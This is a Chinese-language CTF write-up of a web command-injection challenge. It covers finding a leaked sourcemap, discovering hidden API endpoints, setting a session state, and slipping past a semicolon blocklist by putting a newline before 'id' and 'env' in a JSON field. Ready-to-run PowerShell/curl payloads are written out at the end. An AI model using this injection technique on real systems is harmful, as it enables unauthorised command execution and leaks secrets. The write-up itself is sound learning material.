---
title: "命令行注入"
date: 2026-10-13
draft: false
---


web题作者在大量私货里夹杂了少量题目

<img width="601" height="639" alt="image" src="https://github.com/user-attachments/assets/a0211b46-1d59-4bb8-bf07-2a8ea9e16660" />


week2的简答题并不简单（起码我是这样感觉的）

# 信息收集

<img width="199" height="46" alt="image" src="https://github.com/user-attachments/assets/9861ef26-c341-4a30-a375-9d3b4714bb38" />


<img width="1280" height="727" alt="image" src="https://github.com/user-attachments/assets/a80ee727-fb33-40af-91b8-8a254726f1fe" />


看见注入首先想到了sql注入，但进到容器里面发现并非如此

sql注入典型特征是有搜索框或者登录框

但是容器里面可以说是啥也没有只有音乐播放功能

查源码
<img width="306" height="105" alt="image" src="https://github.com/user-attachments/assets/c919ccfc-e87b-4aea-a522-9fbf8f833d5a" />

<img width="455" height="501" alt="image" src="https://github.com/user-attachments/assets/c10bbc98-8bca-479a-8502-e63eb6cd5228" />

（少量题目夹杂大量私货这一块）

感觉有用的是这两部分

<img width="387" height="105" alt="image" src="https://github.com/user-attachments/assets/57e5d684-2996-4504-9914-220f290d50b9" />

<img width="208" height="33" alt="image" src="https://github.com/user-attachments/assets/9b5553a6-70f4-4417-baa4-cc6762781bb3" />

居然还有sourcemap?!

补充：sourcemap 是打包工具生成的调试文件，用来把压缩后的 JS 还原成源码。上线时应该删除，但很多项目忘了。

访问路径发现关键源码

<img width="862" height="527" alt="image" src="https://github.com/user-attachments/assets/ff3deb99-add7-44af-9ebf-19b48fcd30f5" />

扔给ai整理一下

定义隐藏第五元素“Rain”

<img width="645" height="262" alt="image" src="https://github.com/user-attachments/assets/939fa49d-a632-4277-bae1-2d7c964bb236" />

并给出关键注释和接口POST /api/window

<img width="642" height="298" alt="image" src="https://github.com/user-attachments/assets/af08d4d8-bb4b-4d91-988b-94db665d358d" />

只有窗户打开Rain才能进去，这个接口也是管着整个会话状态的关键，他负责设置状态

还有第二个关键点和接口POST /api/ensemble

<img width="598" height="601" alt="image" src="https://github.com/user-attachments/assets/4bfc5632-9263-4186-8639-33f9003bffc1" />

命令行注入构造payload时很可能与它有关

大概是{"title": "...", "parts": { ... }}这样的结构

先试试

<img width="861" height="145" alt="image" src="https://github.com/user-attachments/assets/0a23043a-d8f3-4a9a-818a-b6d6c1021ac5" />

没报错但是也没成功，返回了个我不认识的单词，查了一下notation记谱法

这谁绷的住，打个ctf还要点乐理知识

又查了一下 乐谱里描述一个音，最常见的就是"音名 + 八度"，也就是 C4、A#3、Db5

换一下改成这样

<img width="871" height="105" alt="image" src="https://github.com/user-attachments/assets/3d8bc7e9-e9a5-48bb-8e0c-34a494e31427" />
加了个C4成了，无敌了

再加上rain试试

<img width="869" height="118" alt="image" src="https://github.com/user-attachments/assets/d155f9d4-fc96-4ef4-b458-c5b93146fe3a" />
提示要开窗

OK信息收集到此为止

#  利用过程
开窗：
<img width="630" height="114" alt="image" src="https://github.com/user-attachments/assets/1998490f-3a5e-442f-89ba-441f00d8587d" />

尝试注入：

发现问题————应该有黑名单，是黑盒环境，首先试的;分隔符，被拦了

fuzz,都试一下   \n | & && 

还好\n能用

无害验证：
<img width="847" height="104" alt="image" src="https://github.com/user-attachments/assets/6cf4d512-9fc8-49c0-98be-4c14af3aace0" />

成功绕过！

开始查目录了循序渐进（比较繁琐不再展示）大概就是pwd ls /  ls /app  env

最后在环境变量里找到返回了flag

前面几步还查到了后端源码，也是看见黑名单了

<img width="853" height="190" alt="image" src="https://github.com/user-attachments/assets/8231e2cd-45d0-4c67-a8b4-dfcd501a02eb" />

拿到flag

#  payload
@'
{"state":"open"}
'@ | Set-Content -NoNewline -Encoding ascii window.json

curl.exe -s -c cookies.txt -b cookies.txt `
  -H "Content-Type: application/json" `
  --data-binary "@window.json" `
  "$BASE/api/window"

  '{"title":"x","parts":{"violin":"C4","rain":"a\nid"}}' |
  Set-Content -NoNewline -Encoding ascii p.json

curl.exe -s -b cookies.txt `
  -H "Content-Type: application/json" `
  --data-binary "@p.json" "$BASE/api/ensemble"

  '{"title":"x","parts":{"violin":"C4","rain":"a\nenv"}}' |
  Set-Content -NoNewline -Encoding ascii p.json

curl.exe -s -b cookies.txt `
  -H "Content-Type: application/json" `
  --data-binary "@p.json" "$BASE/api/ensemble"






#  总结

大量私货里少量题目，不过学到了命令行注入和精进curl的用法,也对powershell的一些语法也有了了解

对接口的理解也更深了些，比如那个window那个接口就主管状态，直接在那里设置了cookie

本来真一脸懵逼，啥开窗啊，后来突然想起来之前好像做过类似的，也是设置会话cookie

实际做的时候远没有写的时候顺利，其实折磨我挺久的，其实我挺希望出题人不要夹带那么多私货的

（纯个人见解）






